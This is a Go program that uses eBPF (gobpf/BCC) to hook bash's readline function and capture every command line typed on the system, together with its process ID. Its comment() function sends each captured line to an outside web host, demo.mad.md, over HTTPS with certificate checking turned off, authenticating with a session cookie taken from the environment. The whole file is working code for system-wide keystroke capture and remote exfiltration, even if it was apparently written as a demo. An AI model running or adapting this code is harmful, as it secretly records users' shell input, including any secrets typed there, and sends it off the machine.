// Copyright 2017 Louis McCormack
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
// http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package main

import (
	"bytes"
	"crypto/tls"
	"encoding/binary"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/signal"
	"strings"

	bpf "github.com/iovisor/gobpf/bcc"
)

const source string = `
#include <uapi/linux/ptrace.h>

struct readline_event_t {
        u32 pid;
        char str[80];
} __attribute__((packed));

BPF_PERF_OUTPUT(readline_events);

int get_return_value(struct pt_regs *ctx) {
        struct readline_event_t event = {};
        u32 pid;
        if (!PT_REGS_RC(ctx))
                return 0;
        pid = bpf_get_current_pid_tgid();
        event.pid = pid;
        bpf_probe_read(&event.str, sizeof(event.str), (void *)PT_REGS_RC(ctx));
        readline_events.perf_submit(ctx, &event, sizeof(event));

        return 0;
}
`

type readlineEvent struct {
	Pid uint32
	Str [80]byte
}

func main() {
	m := bpf.NewModule(source, []string{})
	defer m.Close()

	readlineUretprobe, err := m.LoadUprobe("get_return_value")
	if err != nil {
		fmt.Fprintf(os.Stderr, "Failed to load get_return_value: %s\n", err)
		os.Exit(1)
	}

	err = m.AttachUretprobe("/bin/bash", "readline", readlineUretprobe, -1)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Failed to attach return_value: %s\n", err)
		os.Exit(1)
	}

	table := bpf.NewTable(m.TableId("readline_events"), m)

	channel := make(chan []byte)

	perfMap, err := bpf.InitPerfMap(table, channel)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Failed to init perf map: %s\n", err)
		os.Exit(1)
	}

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt, os.Kill)

	go func() {
		var event readlineEvent
		for {
			data := <-channel
			err := binary.Read(bytes.NewBuffer(data), binary.LittleEndian, &event)
			if err != nil {
				fmt.Printf("failed to decode received data: %s\n", err)
				continue
			}
			// Convert C string (null-terminated) to Go string
			comm := string(event.Str[:bytes.IndexByte(event.Str[:], 0)])
			comment("💾 " + fmt.Sprint(event.Pid) + "   🖥️ " + comm)
		}
	}()

	perfMap.Start()
	<-sig
	perfMap.Stop()
}

func comment(comment string) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	body := strings.NewReader("Content=" + comment)
	req, err := http.NewRequest("POST", "https://demo.mad.md/comments/create/"+os.Getenv("POST_UUID"), body)
	if err != nil {
		log.Fatal(err)
	}
	req.Host = "demo.mad.md"
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Cookie", "_blog_app_session="+os.Getenv("COOKIE"))
	req.Header.Set("Upgrade-Insecure-Requests", "1")

	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
}
